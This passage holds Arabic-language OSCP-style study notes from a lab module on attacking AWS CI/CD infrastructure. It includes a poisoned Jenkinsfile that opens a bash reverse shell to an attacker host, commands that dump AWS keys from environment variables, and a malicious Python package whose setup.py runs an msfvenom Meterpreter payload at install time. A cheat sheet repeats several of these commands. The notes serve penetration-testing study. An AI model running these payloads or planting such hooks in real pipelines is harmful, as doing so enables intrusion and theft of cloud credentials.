+<div class="callout-label">السكريبت المكشوف</div>
+<p>سكريبت بيحدّث المتعاونين في سيرفر Git عبر API، بياخد اسم مستخدم وكلمة مرور كـ Arguments، وبيبني رأس HTTP Basic Authentication:</p>
+<p><code>echo 'YWRtaW46UEBzc3dvcmQx' | base64 -d</code> → <code>admin:P@ssword1</code></p>
+</div>
+
+<blockquote>
+<p><strong>مسار الهجوم حتى الآن:</strong> S3 Bucket مُعدّ بشكل خاطئ ← مستودع .git مكشوف ← بيانات اعتماد مسرَّبة ← وصول أدمن كامل على Gitea (كل المستودعات الخاصة، تعديل الكود، تعديل الـ Jenkinsfile، إضافة مفاتيح SSH للاستمرارية).</p>
+</blockquote>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU7 -->
+<h2 id="lu7"><span class="num">07</span><span class="htext">تسميم CI/CD Pipeline</span></h2>
+
+<h3>ملفات إعداد الـ Pipeline</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>المنصة</th><th>ملف الإعداد</th></tr></thead>
+<tbody>
+<tr><td>Jenkins</td><td><code>Jenkinsfile</code></td></tr>
+<tr><td>GitLab</td><td><code>.gitlab-ci.yml</code></td></tr>
+<tr><td>GitHub</td><td><code>.github/workflows/*.yml</code></td></tr>
+</tbody>
+</table></div>
+<p>المشغّلات (Triggers): Push كوميتات لفرع، فتح أو تحديث Pull Request، تنفيذ مجدوَل (cron)، أو Webhook من حدث في المستودع. <strong>صلاحية كتابة على المستودع + Webhook مفعَّل = تنفيذ كود.</strong></p>
+
+<h3>تحديد الـ Pipeline عالي القيمة</h3>
+<ul>
+<li><code>static_content</code> repo — الـ Pipeline بتاعه بيطبع رسائل بس، مفيش عمليات حقيقية</li>
+<li><code>image-transform</code> repo — القيّم: بيستخدم <code>withAWS</code> directive لتحميل بيانات اعتماد سحابية من Jenkins (AWS_ACCESS_KEY_ID، AWS_SECRET_ACCESS_KEY، AWS_DEFAULT_REGION)، وبينشر CloudFormation stacks</li>
+</ul>
+<div class="callout warning">
+<div class="callout-label">نقطة حرجة</div>
+<p>قالب CloudFormation بينشر نظام معالجة صور: Bucketين خاصين (صور أصلية + صور مصغّرة)، Lambda function، وIAM role محدود الصلاحيات للـ Lambda. لكن بيانات اعتماد Jenkins نفسها اللي بتنشر البنية دي عندها صلاحيات أوسع بكتير — هي الهدف الأفضل.</p>
+</div>
+
+<div class="step-track">
+<div class="step-item">
+<div class="step-num">1</div>
+<div class="step-title">تحديد الـ Pipeline الهدف</div>
+<div class="step-body"><p>إيجاد <code>image-transform</code> — الـ Jenkinsfile بتاعه بيستخدم <code>withAWS</code> block.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">2</div>
+<div class="step-title">تجهيز Jenkinsfile خبيث</div>
+<div class="step-body"><p>الحفاظ على <code>withAWS</code> block (عشان تفضل بيانات الاعتماد شغّالة)، وإضافة Stage جديدة بتنفّذ أوامر شل.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">3</div>
+<div class="step-title">اختبار التنفيذ أولًا</div>
+<div class="step-body"><p>إرسال طلب curl بسيط لسيرفر تحت سيطرة المهاجم — للتأكد من الاتصال الخارجي وتنفيذ الأوامر.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">4</div>
+<div class="step-title">إدخال Reverse Shell</div>
+<div class="step-body"><p>استبدال الاختبار بـ Bash reverse shell، وتشغيله في الخلفية لتجنّب الـ Timeout.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">5</div>
+<div class="step-title">دفع الملف المعدَّل</div>
+<div class="step-body"><p>Commit وPush للمستودع — الـ Webhook بيكتشف التغيير ويشغّل الـ Pipeline تلقائيًا.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">6</div>
+<div class="step-title">استقبال الشل</div>
+<div class="step-body"><p>مستمع Netcat على جهاز المهاجم بيستقبل الاتصال من Jenkins build agent.</p></div>
+</div>
+</div>
+
+<div class="code-wrap"><span class="code-tag">jenkinsfile — poisoned payload</span><pre><code>pipeline {
+  agent any
+  stages {
+    stage('Deploy') {
+      steps {
+        withAWS(credentials: 'aws_key') {
+          script {
+            if (isUnix()) {
+              sh '''
+                nohup bash -i >& /dev/tcp/ATTACKER/4444 0>&1 &
+              '''
+            }
+          }
+        } // withAWS بيحافظ على بيانات الاعتماد!
+      }
+    }
+  }
+}
+</code></pre></div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU8 -->
+<h2 id="lu8"><span class="num">08</span><span class="htext">تعداد Build Agent</span></h2>
+
+<h3>الخطوات الأولى بعد الحصول على شل</h3>
+<ul>
+<li><code>id</code>، <code>hostname</code>، <code>uname -a</code> — تأكيد الوصول</li>
+<li>النتائج: Userland قائم على Debian فوق kernel من AWS — مؤشر على بيئة مستضافة على AWS</li>
+<li>مستخدم غير مميَّز — لكن الحاوية ممكن يكون عندها Capabilities مرتفعة</li>
+<li>مفيش أدوات شبكة شائعة مثبّتة (nmap، netstat) — مؤشر على حاوية Minimal مش OS كامل</li>
+</ul>
+
+<h3>تأكيد بيئة الحاوية</h3>
+<div class="code-wrap"><span class="code-tag">container confirmation</span><pre><code>cat /proc/mounts | grep overlay
+# مسارات Overlay filesystem → حاوية Docker مؤكَّدة
+
+cat /proc/1/status | grep Cap
+capsh --decode=&lt;hex_value&gt;
+# النتيجة: الحاوية عندها Capabilities إدارية واسعة
+</code></pre></div>
+<div class="callout warning">
+<div class="callout-label">مؤشر خطر</div>
+<p>مستخدم غير مميَّز + Capabilities عالية = احتمال وارد لـ Container Escape.</p>
+</div>
+
+<h3>استخراج بيانات اعتماد AWS من البيئة</h3>
+<p>الـ <code>withAWS</code> block بتاع الـ Pipeline حقن بيانات الاعتماد في متغيرات البيئة أثناء التنفيذ.</p>
+<div class="code-wrap"><span class="code-tag">env — extract aws credentials</span><pre><code>env | grep -i aws
+
+AWS_ACCESS_KEY_ID=AKIA...
+AWS_SECRET_ACCESS_KEY=abc123...
+AWS_DEFAULT_REGION=us-east-1
+
+# استخدامها على Kali:
+aws configure --profile pipeline
+# بعدين عدّد إيه اللي المفاتيح دي تقدر توصله!
+</code></pre></div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU9 -->
+<h2 id="lu9"><span class="num">09</span><span class="htext">حزمة Python خبيثة</span></h2>
+
+<h3>كيف تعمل هجمات Dependency Chain</h3>
+<ul>
+<li>التطبيق الهدف بيستورد حزم Python من طرف ثالث — نظام البناء بيثبّتها تلقائيًا عبر pip/requirements.txt</li>
+<li>الاستراتيجية: إنشاء حزمة خبيثة تبدو شرعية → نشرها على Registry يستخدمه السيرفر الهدف → انتظار التثبيت التلقائي → تنفيذ الحمولة وقت التثبيت أو الاستيراد</li>
+</ul>
+
+<h3>أقل هيكل لحزمة Python صالحة</h3>
+<div class="code-wrap"><span class="code-tag">minimal package layout</span><pre><code># hackshort-util/            (اسم الحزمة بشرطات)
+#   setup.py
+#   hackshort_util/__init__.py  (شرطات سفلية للاستيراد)
+
+from setuptools import setup
+setup(name='hackshort-util', version='1.0', packages=['hackshort_util'])
+
+# البناء:
+python3 setup.py sdist   # ينشئ أرشيف .tar.gz
+</code></pre></div>
+
+<h3>تسليح setup.py — تنفيذ وقت التثبيت</h3>
+<p>عبر تجاوز (Override) كلاس أمر التثبيت في setup.py — دالة <code>run()</code> بتتنفّذ <strong>أثناء</strong> pip install. حتى من غير استيراد الحزمة، مجرد تثبيتها يكفي لتشغيل الحمولة — وده بيشتعل جوه أي Pipeline بينفّذ <code>pip install -r requirements.txt</code>.</p>
+
+<div class="callout danger">
+<div class="callout-label">سلسلة الهجوم الكاملة بـ Meterpreter</div>
+<p>توليد حمولة Meterpreter بـ msfvenom ← إضافتها لـ utils.py (تشتعل عند الاستيراد) ← تجاوز <code>run()</code> في setup.py (تشتعل عند pip install) ← إعادة بناء الحزمة ورفعها لمرآة PyPI داخلية ← انتظار إعادة بناء سيرفر الإنتاج ← فتح جلسة Meterpreter.</p>
+</div>
+
+<div class="code-wrap"><span class="code-tag">msfvenom + malicious package</span><pre><code>msfvenom -p python/meterpreter/reverse_tcp \
+  LHOST=192.168.118.4 LPORT=4444 -f raw > payload.py
+
+# جوه utils.py:
+exec(open('payload.py').read())  # يشتعل عند الاستيراد
+
+python3 setup.py sdist
+python3 setup.py sdist upload -r NetLab
+
+# على Metasploit:
+use exploit/multi/handler
+set PAYLOAD python/meterpreter/reverse_tcp
+run -j   # انتظار إعادة بناء الإنتاج!
+</code></pre></div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU10 -->
+<h2 id="lu10"><span class="num">10</span><span class="htext">ما بعد الاستغلال وPivoting</span></h2>
+
+<h3>تعداد حاوية الإنتاج</h3>
+<ul>
+<li>جلسة Meterpreter اتفتحت على حاوية الإنتاج — شغّالة بصلاحية <strong>ROOT</strong> كامل التحكّم بالحاوية</li>
+<li>عدة واجهات شبكة → الحاوية في أكثر من Subnet</li>
+<li>Docker overlay filesystem مؤكَّد (حاوية فعلًا)</li>
+<li>الأولوية: فحص متغيرات البيئة أولًا — غالبًا فيها اسم مستخدم أدمن، كلمة مرور، مفاتيح سرية، وسلاسل اتصال قاعدة البيانات</li>
+</ul>
+
+<h3>فحص الشبكة الداخلية — نهج خفيف</h3>
+<p>المشكلة: مفيش nmap أو netstat جوه الحاوية. الحل: كتابة Port Scanner بـ Python باستخدام <code>socket.connect_ex()</code> من غير أي أدوات خارجية — أسرع وأخف وأكثر تخفّيًا من Nmap اللي غالبًا مش مثبّت في الحاويات Minimal وأصلًا ضجيجه أعلى وقابل للكشف من IDS/IPS.</p>
+
+<h3>اكتشاف Jenkins الداخلي</h3>
+<p>فحص الشبكة بيكشف نسخة Jenkins داخلية — سيرفرات CI/CD بتحتفظ بكل بيانات اعتماد النشر ومتصلة بالكود المصدري والبنية الإنتاجية. ممكن يكون عندها تسجيل ذاتي مفعَّل.</p>
+
+<div class="code-wrap"><span class="code-tag">lightweight port scan + jenkins discovery</span><pre><code>python3 -c "
+import socket
+for port in [80,443,8080,8443,22,3306]:
+    s=socket.socket(); s.settimeout(0.5)
+    if not s.connect_ex(('10.x.x.x',port)):
+        print(f'{port} open')"
+# 8080 open → Jenkins!
+
+curl http://10.x.x.x:8080/
+# التسجيل الذاتي مفعَّل!
+
+curl http://10.x.x.x:8080/plugin/s3explorer/ | grep -i aws
+# مفاتيح AWS في مصدر الصفحة!
+</code></pre></div>
+<div class="callout tip">
+<div class="callout-label">الدورة تتكرر</div>
+<p>بعد إنشاء حساب وتسجيل الدخول، تصفّح الإضافات (Plugins) → S3 Explorer → مصدر الصفحة فيه بيانات اعتماد AWS جديدة لاستخدامها في تعداد Buckets إضافية.</p>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ METHODOLOGY -->
+<h2 id="methodology"><span class="num">--</span><span class="htext">سلسلة الهجوم الكاملة</span></h2>
+
+<div class="step-track">
+<div class="step-item">
+<div class="step-num">1</div>
+<div class="step-title">تعداد التطبيق</div>
+<div class="step-body"><p>فحص dirb ما لقى حاجة → مصدر HTML كشف رابط S3 bucket مع أصول صور.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">2</div>
+<div class="step-title">استكشاف S3 Bucket</div>
+<div class="step-body"><p>سرد المجلد محظور → فحص Wordlist لقى مجلد <code>.git/</code> مخفي في التخزين العام.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">3</div>
+<div class="step-title">تحميل وتحليل المستودع</div>
+<div class="step-body"><p><code>aws s3 sync</code> بيحمّل المستودع كامل بما فيه Jenkinsfile وسكريبتات الأتمتة.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">4</div>
+<div class="step-title">استخراج بيانات الاعتماد</div>
+<div class="step-body"><p>سكريبت فيه HTTP Basic Auth مرمّز بـ Base64 → فك الترميز → <code>admin:P@ssword1</code> لـ Gitea.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">5</div>
+<div class="step-title">تسميم الـ Pipeline</div>
+<div class="step-body"><p>تسجيل دخول كأدمن على Gitea → تعديل Jenkinsfile في <code>image-transform</code> → Push → الـ Webhook بيشتعل.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">6</div>
+<div class="step-title">شل على Build Agent</div>
+<div class="step-body"><p>Jenkins بينفّذ الـ Pipeline المسمَّم → Reverse shell بيفتح → متغيرات البيئة فيها بيانات اعتماد AWS.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">7</div>
+<div class="step-title">هجوم Dependency Chain</div>
+<div class="step-body"><p>إنشاء حزمة Python خبيثة → رفعها على PyPI داخلي → سيرفر الإنتاج بيثبّتها → Meterpreter.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">8</div>
+<div class="step-title">ما بعد الاستغلال</div>
+<div class="step-body"><p>Root على الحاوية → فحص متغيرات البيئة → فحص الشبكة الداخلية → إيجاد Jenkins → بيانات اعتماد AWS جديدة عبر S3 Explorer.</p></div>
+</div>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ CHEAT SHEET -->
+<h2 id="cheat"><span class="num">--</span><span class="htext">Cheat Sheet مرجعي</span></h2>
+<div class="cheat-section">
+
+<h4>تعداد S3 وGit</h4>
+<div class="code-wrap"><span class="code-tag">quick reference</span><pre><code>dirb http://target.com /usr/share/wordlists/dirb/common.txt
+gobuster dir -u https://&lt;bucket&gt;.s3.amazonaws.com/ -w wordlist.txt
+aws s3 ls s3://bucket-name/
+aws s3 sync s3://bucket-name ./local/
+gitleaks detect --source ./local/ -v
+</code></pre></div>
+
+<h4>تسميم Jenkins Pipeline</h4>
+<div class="code-wrap"><span class="code-tag">jenkinsfile reverse shell stage</span><pre><code>stage('Deploy') {
+  steps {
+    withAWS(credentials: 'aws_key') {
+      sh 'nohup bash -i >& /dev/tcp/ATTACKER/4444 0>&1 &'
+    }
+  }
+}
+</code></pre></div>
+
+<h4>استخراج بيانات اعتماد AWS من حاوية</h4>
+<div class="code-wrap"><span class="code-tag">quick reference</span><pre><code>env | grep -i aws
+cat /proc/mounts | grep overlay
+cat /proc/1/status | grep Cap
+aws configure --profile pipeline
+</code></pre></div>
+
+<h4>حزمة Python خبيثة</h4>
+<div class="code-wrap"><span class="code-tag">quick reference</span><pre><code>msfvenom -p python/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=4444 -f raw &gt; payload.py
+python3 setup.py sdist
+python3 setup.py sdist upload -r &lt;internal-pypi&gt;
+</code></pre></div>
+
+<h4>Quick Wins — أسرع المسارات في بيئة AWS CI/CD</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>#</th><th>التحقق</th><th>الأمر</th><th>المسار المناسب</th></tr></thead>
+<tbody>
+<tr><td>1</td><td>صور ثابتة بتتقدَّم من S3؟</td><td>فحص مصدر HTML</td><td>تحديد اسم الـ Bucket</td></tr>
+<tr><td>2</td><td>فيه .git مكشوف جوه الـ Bucket؟</td><td><code>gobuster</code> + <code>aws s3 sync</code></td><td>تسريب أسرار Git History</td></tr>
+<tr><td>3</td><td>Jenkinsfile بيستخدم withAWS؟</td><td>فحص المستودعات</td><td>Pipeline Poisoning</td></tr>
+<tr><td>4</td><td>متغيرات بيئة فيها AWS keys؟</td><td><code>env | grep -i aws</code></td><td>استخدام بيانات اعتماد Pipeline</td></tr>
+<tr><td>5</td><td>requirements.txt بيثبّت حزم تلقائيًا؟</td><td>فحص PyPI الداخلي</td><td>Dependency Chain Attack</td></tr>
+</tbody>
+</table></div>
+
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ SUMMARY -->
+<h2 id="summary"><span class="htext">الخلاصة العامة للموديول</span></h2>
+<p>الموديول ده غطّى مهاجمة بنية AWS السحابية عبر سلسلة CI/CD كاملة — بداية من S3 bucket مُعدّ بشكل خاطئ، مرورًا بتسريب أسرار Git وتسميم Jenkins Pipeline، ووصولًا لهجوم Dependency Chain وPivoting الداخلي بين حاويات الإنتاج.</p>
+
+<div class="takeaways">
+<div class="takeaways-title">$ cat ./module23_summary.txt</div>
+<ul>
+<li>CI/CD Pipelines هي العمود الفقري الآلي للبيئات السحابية — اختراق واحد يعني وراثة كل صلاحياته</li>
+<li>تاريخ Git أبدًا مش بيحذف الأسرار فعليًا — افحص سجل الـ Commits دايمًا، مش الملفات الحالية بس، باستخدام أدوات زي Gitleaks</li>
+<li>S3 Buckets المُعدّة بشكل خاطئ ممكن تكشف مستودع Git كامل فيه بيانات اعتماد مرمّزة بـ Base64</li>
+<li>تسميم Pipeline = تعديل Jenkinsfile → Push للمستودع → Webhook بيشغّل البناء → الأوامر بتتنفّذ ببيانات اعتماد الـ Pipeline السحابية</li>
+<li>Build Agents غالبًا حاويات بصلاحيات مرتفعة — متغيرات البيئة غالبًا فيها مفاتيح وصول سحابية</li>
+<li>هجمات Dependency Chain بتستغل الثقة في تثبيت الحزم — setup.py خبيث بينفّذ كود عشوائي أثناء pip install</li>
+<li>ما بعد الاستغلال جوه الحاويات: افحص متغيرات البيئة أولًا — بيانات اعتماد AWS بتتحقن هناك أثناء تنفيذ الـ Pipeline</li>
+<li>الشبكات الداخلية خلف الحاويات المخترَقة غالبًا دفاعها ضعيف — ماسحات منافذ خفيفة بـ Python بتتجنّب الكشف</li>
+<li>إضافات Jenkins زي S3 Explorer ممكن تسرّب بيانات اعتماد سحابية مباشرة في مصدر الصفحة</li>
+<li>كل اختراق بيكشف بيانات اعتماد جديدة → وصول جديد → تتكرر دورة التعداد في كل مستوى جديد</li>
+</ul>
+</div>
+
+<blockquote>
+<p><strong>كل هجمات الموديول ده مبنية على فكرة واحدة:</strong> الثقة الممنوحة لـ Pipeline وتخزين سحابي أكبر من التحقق الفعلي المطبَّق عليهم. المختبر اللي بيتتبّع سلسلة الثقة دي — من S3 العام وحتى بيانات اعتماد الـ Pipeline — هو اللي بيوصل لسيطرة كاملة على البنية السحابية بأقل عدد خطوات.</p>
+</blockquote>
+
+<div class="callout examtip">
+<div class="callout-label">Professional Mindset</div>
+<p>في الـ Engagement الحقيقي: ابدأ دايمًا بتعداد سطح الهجوم الخارجي (تطبيق الويب، S3 buckets، سيرفرات Git/CI معروفة) → افحص أي تخزين عام بحثًا عن مستودعات أو ملفات إعداد مسرَّبة → استخدم أي بيانات اعتماد مكتشَفة لتصعيد الوصول على سيرفر Git أو CI/CD → استغل صلاحيات الـ Pipeline نفسها بدل محاولة استغلال التطبيق مباشرة → وبمجرد الوصول لشل على Build Agent، افحص متغيرات البيئة فورًا. وثَّق كل خطوة، حتى الفاشلة.</p>
+</div>
+
+<hr />
+<p><em>نهاية نوتس الموديول الثالث والعشرين — Attacking AWS Cloud Infrastructure</em></p>
+<div class="footer-note">-- EOF: module-23/aws-cicd-attacks.md --</div>
+
+</div>
+
+<script>
+(function(){
+  var root=document.documentElement,btn=document.getElementById('themeSwitch');
+  function applyTheme(t){root.setAttribute('data-theme',t);btn.textContent='theme: '+t;try{localStorage.setItem('oscp-notes-theme',t);}catch(e){}}
+  var saved='dark';try{saved=localStorage.getItem('oscp-notes-theme')||'dark';}catch(e){}
+  applyTheme(saved);
+  btn.addEventListener('click',function(){applyTheme(root.getAttribute('data-theme')==='dark'?'light':'dark');});
+  var bar=document.getElementById('progressBar');
+  function onScroll(){var h=document.documentElement,s=h.scrollTop,ht=h.scrollHeight-h.clientHeight;bar.style.width=(ht>0?(s/ht*100):0)+'%';var t=document.getElementById('toTop');s>500?t.classList.add('show'):t.classList.remove('show');}
+  document.addEventListener('scroll',onScroll);onScroll();
+  document.getElementById('toTop').addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+  document.querySelectorAll('.code-wrap').forEach(function(wrap){
+    var c=wrap.querySelector('code');if(!c)return;
+    var b=document.createElement('button');b.className='copy-btn';b.textContent='copy';
+    b.addEventListener('click',function(){if(navigator.clipboard){navigator.clipboard.writeText(c.innerText).then(function(){b.textContent='copied ✓';b.classList.add('copied');setTimeout(function(){b.textContent='copy';b.classList.remove('copied');},1500);});}});
+    wrap.appendChild(b);
+  });
+})();
+</script>
+</body>
+</html>
